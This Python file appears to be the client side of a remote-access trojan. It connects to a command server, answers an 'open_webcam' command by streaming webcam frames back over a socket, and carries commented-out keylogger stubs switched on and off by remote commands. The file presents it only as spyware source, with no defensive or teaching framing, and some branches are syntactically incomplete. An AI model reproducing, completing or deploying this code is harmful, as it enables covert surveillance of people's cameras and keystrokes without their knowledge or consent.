import socket 
import threading
import socket, cv2
import numpy
import struct
import pickle

# -- these import are possible for the keyloggers
# from pynput.keyboard import Key, Listener
# from pynput import keyboard


PORT = 8080
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def recWebCam(SERVER):
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) #Capture from webcam
    while True:
        ret, frame = cap.read()
        data = pickle.dumps(frame)
        message_size = struct.pack("L", len(data))
        client.sendall(message_size + data)

        # client.close()

'''
# -- this is the code for the keylogger which is currently not working

def on_press(key):
    # get the key and send it
    pass

def startKeylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def stopLogger():
    listener.stop()
'''

print(f"[CLIENT CONNECTED] -- {SERVER}, {type(SERVER)}")

def client_func():
    
    while True:
        # addr = SERVER
        command = client.recv(1024*1024).decode()
        if 'open_webcam' in command:
            thread = threading.Thread(target=recWebCam, args=(SERVER,))
            thread.start()
        elif 'logger_start' in command:
            # startKeylogger()
        elif 'logger_end' in command:
            # stopLogger()

client_func()